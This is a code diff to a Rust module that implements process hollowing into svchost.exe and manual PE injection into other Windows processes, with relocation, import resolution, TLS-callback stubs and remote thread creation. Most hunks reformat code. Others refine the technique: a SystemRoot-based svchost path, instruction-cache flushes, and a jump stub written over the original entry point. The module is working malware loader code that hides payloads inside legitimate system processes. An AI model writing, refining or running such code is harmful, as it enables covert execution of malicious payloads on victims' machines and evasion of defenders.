@@ -11,24 +11,26 @@ use std::ffi::{c_void, CStr, OsStr};
 use std::mem::{size_of, zeroed};
 use std::os::windows::ffi::OsStrExt;
 use winapi::shared::minwindef::{FARPROC, HMODULE};
+use winapi::um::handleapi::CloseHandle;
 use winapi::um::libloaderapi::{GetProcAddress, LoadLibraryA};
 use winapi::um::memoryapi::{
     ReadProcessMemory, VirtualAllocEx, VirtualProtectEx, WriteProcessMemory,
 };
 use winapi::um::processthreadsapi::{
-    CreateProcessW, CreateRemoteThread, GetThreadContext, ResumeThread, SetThreadContext,
-    TerminateProcess, OpenProcess, PROCESS_INFORMATION, STARTUPINFOW,
+    CreateProcessW, CreateRemoteThread, GetThreadContext, OpenProcess, ResumeThread,
+    SetThreadContext, TerminateProcess, PROCESS_INFORMATION, STARTUPINFOW,
 };
-use winapi::um::handleapi::CloseHandle;
-use winapi::um::winnt::{PROCESS_VM_OPERATION, PROCESS_VM_WRITE, PROCESS_VM_READ, PROCESS_CREATE_THREAD};
 use winapi::um::winbase::{CREATE_SUSPENDED, DETACHED_PROCESS};
 use winapi::um::winnt::{
-    CONTEXT, CONTEXT_FULL, HANDLE, IMAGE_BASE_RELOCATION,
-    IMAGE_DIRECTORY_ENTRY_BASERELOC, IMAGE_DIRECTORY_ENTRY_IMPORT, IMAGE_DOS_HEADER,
-    IMAGE_IMPORT_DESCRIPTOR, IMAGE_NT_HEADERS, IMAGE_REL_BASED_DIR64, IMAGE_REL_BASED_HIGHLOW,
-    IMAGE_SCN_MEM_EXECUTE, IMAGE_SCN_MEM_READ, IMAGE_SCN_MEM_WRITE, IMAGE_SECTION_HEADER,
-    IMAGE_SNAP_BY_ORDINAL, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE, PAGE_EXECUTE_READ,
-    PAGE_EXECUTE_READWRITE, PAGE_NOACCESS, PAGE_READONLY, PAGE_READWRITE, PVOID,
+    CONTEXT, CONTEXT_FULL, HANDLE, IMAGE_BASE_RELOCATION, IMAGE_DIRECTORY_ENTRY_BASERELOC,
+    IMAGE_DIRECTORY_ENTRY_IMPORT, IMAGE_DOS_HEADER, IMAGE_IMPORT_DESCRIPTOR, IMAGE_NT_HEADERS,
+    IMAGE_REL_BASED_DIR64, IMAGE_REL_BASED_HIGHLOW, IMAGE_SCN_MEM_EXECUTE, IMAGE_SCN_MEM_READ,
+    IMAGE_SCN_MEM_WRITE, IMAGE_SECTION_HEADER, IMAGE_SNAP_BY_ORDINAL, MEM_COMMIT, MEM_RESERVE,
+    PAGE_EXECUTE, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE, PAGE_NOACCESS, PAGE_READONLY,
+    PAGE_READWRITE, PVOID,
+};
+use winapi::um::winnt::{
+    PROCESS_CREATE_THREAD, PROCESS_VM_OPERATION, PROCESS_VM_READ, PROCESS_VM_WRITE,
 };
 
 /// Native `PROCESS_BASIC_INFORMATION` layout (class 0 of `NtQueryInformationProcess`).
@@ -163,9 +165,8 @@ pub fn hollow_and_execute(payload: &[u8]) -> Result<()> {
     if nt_headers_offset + size_of::<IMAGE_NT_HEADERS>() > payload.len() {
         return Err(anyhow!("payload truncated before NT headers"));
     }
-    let nt_headers = unsafe {
-        &*((payload.as_ptr() as usize + nt_headers_offset) as *const IMAGE_NT_HEADERS)
-    };
+    let nt_headers =
+        unsafe { &*((payload.as_ptr() as usize + nt_headers_offset) as *const IMAGE_NT_HEADERS) };
     if nt_headers.Signature != 0x00004550 {
         return Err(anyhow!("invalid NT signature"));
     }
@@ -174,7 +175,10 @@ pub fn hollow_and_execute(payload: &[u8]) -> Result<()> {
     si.cb = size_of::<STARTUPINFOW>() as u32;
     let mut pi: PROCESS_INFORMATION = unsafe { zeroed() };
 
-    let cmd: Vec<u16> = OsStr::new("C:\\Windows\\System32\\svchost.exe")
+    let system_root = std::env::var("SystemRoot").unwrap_or_else(|_| "C:\\Windows".to_string());
+    let svchost_path = format!("{}\\System32\\svchost.exe", system_root);
+
+    let cmd: Vec<u16> = OsStr::new(&svchost_path)
         .encode_wide()
         .chain(std::iter::once(0))
         .collect();
@@ -194,14 +198,17 @@ pub fn hollow_and_execute(payload: &[u8]) -> Result<()> {
         )
     };
     if ok == 0 {
-        return Err(anyhow!("CreateProcessW failed: {}", std::io::Error::last_os_error()));
+        return Err(anyhow!(
+            "CreateProcessW failed: {}",
+            std::io::Error::last_os_error()
+        ));
     }
 
     // From this point any error must terminate the suspended process and close
     // both handles; the guard does that automatically via Drop.
     let mut guard = ProcessGuard::new(pi);
     let pi = &guard.pi; // shadow the local so all subsequent code uses the guard's copy via NtQueryInformationProcess(ProcessBasicInformation)
-    // and read the `ImageBaseAddress` field out of the remote PEB.
+                        // and read the `ImageBaseAddress` field out of the remote PEB.
     let mut base_addr_ptr: PVOID = std::ptr::null_mut();
     let mut pbi: PROCESS_BASIC_INFORMATION = unsafe { zeroed() };
     let info_class: u32 = 0; // ProcessBasicInformation
@@ -306,7 +313,10 @@ pub fn hollow_and_execute(payload: &[u8]) -> Result<()> {
             )
         };
         if new_base.is_null() {
-            return Err(anyhow!("VirtualAllocEx failed: {}", std::io::Error::last_os_error()));
+            return Err(anyhow!(
+                "VirtualAllocEx failed: {}",
+                std::io::Error::last_os_error()
+            ));
         }
         (new_base, true)
     } else {
@@ -345,7 +355,10 @@ pub fn hollow_and_execute(payload: &[u8]) -> Result<()> {
         )
     };
     if ok == 0 {
-        return Err(anyhow!("WriteProcessMemory for headers failed: {}", std::io::Error::last_os_error()));
+        return Err(anyhow!(
+            "WriteProcessMemory for headers failed: {}",
+            std::io::Error::last_os_error()
+        ));
     }
 
     // Copy sections
@@ -358,8 +371,7 @@ pub fn hollow_and_execute(payload: &[u8]) -> Result<()> {
                 as *const IMAGE_SECTION_HEADER)
         };
 
-        let section_dest =
-            (image_base as usize + section_header.VirtualAddress as usize) as *mut _;
+        let section_dest = (image_base as usize + section_header.VirtualAddress as usize) as *mut _;
         let section_src =
             (payload.as_ptr() as usize + section_header.PointerToRawData as usize) as *const u8;
 
@@ -374,16 +386,19 @@ pub fn hollow_and_execute(payload: &[u8]) -> Result<()> {
             )
         };
         if ok == 0 {
-            return Err(anyhow!("WriteProcessMemory for section {} failed: {}",
-                String::from_utf8_lossy(&section_header.Name), std::io::Error::last_os_error()));
+            return Err(anyhow!(
+                "WriteProcessMemory for section {} failed: {}",
+                String::from_utf8_lossy(&section_header.Name),
+                std::io::Error::last_os_error()
+            ));
         }
     }
 
     // Perform base relocations if needed
     if is_relocated {
         let delta = image_base as isize - nt_headers.OptionalHeader.ImageBase as isize;
-        let reloc_dir = &nt_headers.OptionalHeader.DataDirectory
-            [IMAGE_DIRECTORY_ENTRY_BASERELOC as usize];
+        let reloc_dir =
+            &nt_headers.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC as usize];
 
         if reloc_dir.VirtualAddress > 0 && reloc_dir.Size > 0 {
             // The relocation directory's VirtualAddress is an RVA, not a file
@@ -453,8 +468,8 @@ pub fn hollow_and_execute(payload: &[u8]) -> Result<()> {
                     let reloc_offset = entry & 0x0FFF;
 
                     // The relocation directory (and headers) is NOT written to the remote process's
-                    // memory. Therefore, we MUST read reloc_block_header.VirtualAddress and the 
-                    // relocation entries from our local `payload` buffer, combining it with the remote 
+                    // memory. Therefore, we MUST read reloc_block_header.VirtualAddress and the
+                    // relocation entries from our local `payload` buffer, combining it with the remote
                     // image base to calculate the remote patch address.
                     let patch_base = image_base as usize
                         + reloc_block_header.VirtualAddress as usize
@@ -470,7 +485,8 @@ pub fn hollow_and_execute(payload: &[u8]) -> Result<()> {
                                 &mut orig as *mut _ as *mut _,
                                 size_of::<i64>(),
                                 &mut bytes_read,
-                            ) == 0 {
+                            ) == 0
+                            {
                                 continue;
                             }
                         }
@@ -496,7 +512,8 @@ pub fn hollow_and_execute(payload: &[u8]) -> Result<()> {
                                 &mut orig as *mut _ as *mut _,
                                 size_of::<u32>(),
                                 &mut bytes_read,
-                            ) == 0 {
+                            ) == 0
+                            {
                                 continue;
                             }
                         }
@@ -526,8 +543,8 @@ pub fn hollow_and_execute(payload: &[u8]) -> Result<()> {
     // each function locally with LoadLibraryA/GetProcAddress (which operate
     // on the parent's address space), then write resolved addresses back
     // into the child's IAT with WriteProcessMemory.
-    let import_dir = &nt_headers.OptionalHeader.DataDirectory
-        [IMAGE_DIRECTORY_ENTRY_IMPORT as usize];
+    let import_dir =
+        &nt_headers.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT as usize];
     if import_dir.VirtualAddress > 0 {
         let mut import_desc_offset = import_dir.VirtualAddress as usize;
         loop {
@@ -573,7 +590,11 @@ pub fn hollow_and_execute(payload: &[u8]) -> Result<()> {
             // FirstThunk = IAT: we overwrite this with the resolved addresses.
             let orig_first_thunk = unsafe { *import_desc.u.Characteristics() } as usize;
             let first_thunk = import_desc.FirstThunk as usize;
-            let ilt_base = if orig_first_thunk != 0 { orig_first_thunk } else { first_thunk };
+            let ilt_base = if orig_first_thunk != 0 {
+                orig_first_thunk
+            } else {
+                first_thunk
+            };
             let mut read_offset = ilt_base;
             let mut write_offset = first_thunk;
             loop {
@@ -613,10 +634,7 @@ pub fn hollow_and_execute(payload: &[u8]) -> Result<()> {
                 };
 
                 if proc_addr.is_null() {
-                    return Err(anyhow!(
-                        "Failed to resolve function in {}",
-                        lib_name
-                    ));
+                    return Err(anyhow!("Failed to resolve function in {}", lib_name));
                 }
 
                 let mut written: usize = 0;
@@ -669,14 +687,15 @@ pub fn hollow_and_execute(payload: &[u8]) -> Result<()> {
             (false, false, false) => PAGE_NOACCESS,
         };
 
-
         unsafe {
             if VirtualProtectEx(pi.hProcess, addr, size, new_protect, &mut old_protect) == 0 {
-                tracing::warn!("VirtualProtectEx failed for section {}", String::from_utf8_lossy(&section_header.Name));
+                tracing::warn!(
+                    "VirtualProtectEx failed for section {}",
+                    String::from_utf8_lossy(&section_header.Name)
+                );
             }
         }
     }
-
 
     let mut entry_point =
         image_base as usize + nt_headers.OptionalHeader.AddressOfEntryPoint as usize;
@@ -750,16 +769,19 @@ pub fn hollow_and_execute(payload: &[u8]) -> Result<()> {
                     let ib = image_base as usize as u64;
                     for &cb in &tls_callbacks {
                         stub.extend_from_slice(&[0x48, 0x83, 0xEC, 0x28]); // sub rsp,0x28
-                        stub.push(0x48); stub.push(0xB9);                   // mov rcx, imm64
+                        stub.push(0x48);
+                        stub.push(0xB9); // mov rcx, imm64
                         stub.extend_from_slice(&ib.to_le_bytes());
                         stub.extend_from_slice(&[0xBA, 0x01, 0x00, 0x00, 0x00]); // mov edx,1
-                        stub.extend_from_slice(&[0x45, 0x31, 0xC0]);            // xor r8d,r8d
-                        stub.push(0x48); stub.push(0xB8);                   // mov rax, imm64
+                        stub.extend_from_slice(&[0x45, 0x31, 0xC0]); // xor r8d,r8d
+                        stub.push(0x48);
+                        stub.push(0xB8); // mov rax, imm64
                         stub.extend_from_slice(&(cb as u64).to_le_bytes());
-                        stub.extend_from_slice(&[0xFF, 0xD0]);              // call rax
+                        stub.extend_from_slice(&[0xFF, 0xD0]); // call rax
                         stub.extend_from_slice(&[0x48, 0x83, 0xC4, 0x28]); // add rsp,0x28
                     }
-                    stub.push(0x48); stub.push(0xB8); // mov rax, imm64 (entry_point)
+                    stub.push(0x48);
+                    stub.push(0xB8); // mov rax, imm64 (entry_point)
                     stub.extend_from_slice(&(entry_point as u64).to_le_bytes());
                     stub.extend_from_slice(&[0xFF, 0xE0]); // jmp rax
 
@@ -795,7 +817,10 @@ pub fn hollow_and_execute(payload: &[u8]) -> Result<()> {
     let mut ctx: CONTEXT = unsafe { zeroed() };
     ctx.ContextFlags = CONTEXT_FULL;
     if unsafe { GetThreadContext(pi.hThread, &mut ctx) } == 0 {
-        return Err(anyhow!("GetThreadContext failed: {}", std::io::Error::last_os_error()));
+        return Err(anyhow!(
+            "GetThreadContext failed: {}",
+            std::io::Error::last_os_error()
+        ));
     }
     // On x64, set Rip directly to the payload entry point so the resumed thread
     // starts executing the new image immediately.  We also leave Rcx pointing at
@@ -807,19 +832,73 @@ pub fn hollow_and_execute(payload: &[u8]) -> Result<()> {
     // would dereference unmapped pointers in `LdrInitializeThunk`.
     #[cfg(target_arch = "x86_64")]
     {
-        ctx.Rip = entry_point as u64;
-        ctx.Rcx = entry_point as u64;
+        let orig_ep = ctx.Rcx as *mut c_void;
+        unsafe {
+            VirtualAllocEx(
+                pi.hProcess,
+                orig_ep,
+                0x1000,
+                MEM_COMMIT | MEM_RESERVE,
+                PAGE_EXECUTE_READWRITE,
+            );
+            let mut jmp_stub: [u8; 12] = [
+                0x48, 0xB8, 0, 0, 0, 0, 0, 0, 0, 0, // mov rax, <entry_point>
+                0xFF, 0xE0, // jmp rax
+            ];
+            jmp_stub[2..10].copy_from_slice(&(entry_point as u64).to_le_bytes());
+            let mut written = 0;
+            WriteProcessMemory(
+                pi.hProcess,
+                orig_ep,
+                jmp_stub.as_ptr() as *const _,
+                jmp_stub.len(),
+                &mut written,
+            );
+        }
     }
     #[cfg(target_arch = "x86")]
     {
-        ctx.Eip = entry_point as u32;
-        ctx.Eax = entry_point as u32;
+        let orig_ep = ctx.Eax as *mut c_void;
+        unsafe {
+            VirtualAllocEx(
+                pi.hProcess,
+                orig_ep,
+                0x1000,
+                MEM_COMMIT | MEM_RESERVE,
+                PAGE_EXECUTE_READWRITE,
+            );
+            let mut jmp_stub: [u8; 5] = [0xE9, 0, 0, 0, 0]; // jmp rel32
+            let rel32 = (entry_point as u32)
+                .wrapping_sub(orig_ep as u32)
+                .wrapping_sub(5);
+            jmp_stub[1..5].copy_from_slice(&rel32.to_le_bytes());
+            let mut written = 0;
+            WriteProcessMemory(
+                pi.hProcess,
+                orig_ep,
+                jmp_stub.as_ptr() as *const _,
+                jmp_stub.len(),
+                &mut written,
+            );
+        }
     }
     if unsafe { SetThreadContext(pi.hThread, &ctx) } == 0 {
-        return Err(anyhow!("SetThreadContext failed: {}", std::io::Error::last_os_error()));
+        return Err(anyhow!(
+            "SetThreadContext failed: {}",
+            std::io::Error::last_os_error()
+        ));
     }
+
+    // Flush the instruction cache to ensure coherent execution
+    unsafe {
+        winapi::um::processthreadsapi::FlushInstructionCache(pi.hProcess, std::ptr::null(), 0);
+    }
+
     if unsafe { ResumeThread(pi.hThread) } == u32::MAX {
-        return Err(anyhow!("ResumeThread failed: {}", std::io::Error::last_os_error()));
+        return Err(anyhow!(
+            "ResumeThread failed: {}",
+            std::io::Error::last_os_error()
+        ));
     }
     tracing::info!(pid = pi.dwProcessId, "hollowed payload running");
     // Success — disarm the guard so the process is not terminated, then close
@@ -867,9 +946,8 @@ pub fn inject_into_process(process: HANDLE, payload: &[u8]) -> Result<()> {
     if nt_headers_offset + size_of::<IMAGE_NT_HEADERS>() > payload.len() {
         return Err(anyhow!("payload truncated before NT headers"));
     }
-    let nt_headers = unsafe {
-        &*((payload.as_ptr() as usize + nt_headers_offset) as *const IMAGE_NT_HEADERS)
-    };
+    let nt_headers =
+        unsafe { &*((payload.as_ptr() as usize + nt_headers_offset) as *const IMAGE_NT_HEADERS) };
     if nt_headers.Signature != 0x00004550 {
         return Err(anyhow!("invalid NT signature"));
     }
@@ -1000,8 +1078,8 @@ pub fn inject_into_process(process: HANDLE, payload: &[u8]) -> Result<()> {
     // 4. Apply base relocations if required.
     if is_relocated {
         let delta = image_base as isize - nt_headers.OptionalHeader.ImageBase as isize;
-        let reloc_dir = &nt_headers.OptionalHeader.DataDirectory
-            [IMAGE_DIRECTORY_ENTRY_BASERELOC as usize];
+        let reloc_dir =
+            &nt_headers.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC as usize];
         if reloc_dir.VirtualAddress > 0 && reloc_dir.Size > 0 {
             let reloc_file_offset = match unsafe {
                 rva_to_file_offset(
@@ -1032,19 +1110,18 @@ pub fn inject_into_process(process: HANDLE, payload: &[u8]) -> Result<()> {
                 if block_size < size_of::<IMAGE_BASE_RELOCATION>() {
                     break;
                 }
-                let num_entries = (block_size - size_of::<IMAGE_BASE_RELOCATION>()) / size_of::<u16>();
+                let num_entries =
+                    (block_size - size_of::<IMAGE_BASE_RELOCATION>()) / size_of::<u16>();
                 for i in 0..num_entries {
-                    let entry_off =
-                        cur + size_of::<IMAGE_BASE_RELOCATION>() + i * size_of::<u16>();
+                    let entry_off = cur + size_of::<IMAGE_BASE_RELOCATION>() + i * size_of::<u16>();
                     let entry = unsafe { *(payload.as_ptr().add(entry_off) as *const u16) };
                     let reloc_type = entry >> 12;
                     let reloc_offset = entry & 0x0FFF;
 
-                    // The relocation directory is strictly read from our local `payload` buffer 
+                    // The relocation directory is strictly read from our local `payload` buffer
                     // because it is never written into the remote process headers.
-                    let patch_base = image_base as usize
-                        + block.VirtualAddress as usize
-                        + reloc_offset as usize;
+                    let patch_base =
+                        image_base as usize + block.VirtualAddress as usize + reloc_offset as usize;
                     if reloc_type == IMAGE_REL_BASED_DIR64 {
                         let patch_addr = patch_base as *mut c_void;
                         let mut orig: i64 = 0;
@@ -1154,7 +1231,11 @@ pub fn inject_into_process(process: HANDLE, payload: &[u8]) -> Result<()> {
             // FirstThunk = IAT: we overwrite this with the resolved addresses.
             let orig_first_thunk = unsafe { *import_desc.u.Characteristics() } as usize;
             let first_thunk = import_desc.FirstThunk as usize;
-            let ilt_base = if orig_first_thunk != 0 { orig_first_thunk } else { first_thunk };
+            let ilt_base = if orig_first_thunk != 0 {
+                orig_first_thunk
+            } else {
+                first_thunk
+            };
             let mut read_offset = ilt_base;
             let mut write_offset = first_thunk;
             loop {
@@ -1185,8 +1266,7 @@ pub fn inject_into_process(process: HANDLE, payload: &[u8]) -> Result<()> {
                     unsafe { GetProcAddress(lib_handle, ordinal as *const i8) }
                 } else {
                     let name_remote = image_base as usize + func_addr_val + 2;
-                    let func_name =
-                        unsafe { read_remote_cstr(process, name_remote)? };
+                    let func_name = unsafe { read_remote_cstr(process, name_remote)? };
                     let func_name_c = std::ffi::CString::new(func_name.as_bytes())
                         .map_err(|e| anyhow!("invalid imported function name: {e}"))?;
                     unsafe { GetProcAddress(lib_handle, func_name_c.as_ptr()) }
@@ -1248,9 +1328,13 @@ pub fn inject_into_process(process: HANDLE, payload: &[u8]) -> Result<()> {
         }
     }
 
+    // Flush the instruction cache to ensure coherent execution for the new mappings
+    unsafe {
+        winapi::um::processthreadsapi::FlushInstructionCache(process, std::ptr::null(), 0);
+    }
+
     // 7. Create a remote thread at the payload's entry point.
-    let entry_point =
-        image_base as usize + nt_headers.OptionalHeader.AddressOfEntryPoint as usize;
+    let entry_point = image_base as usize + nt_headers.OptionalHeader.AddressOfEntryPoint as usize;
     let thread = unsafe {
         CreateRemoteThread(
             process,
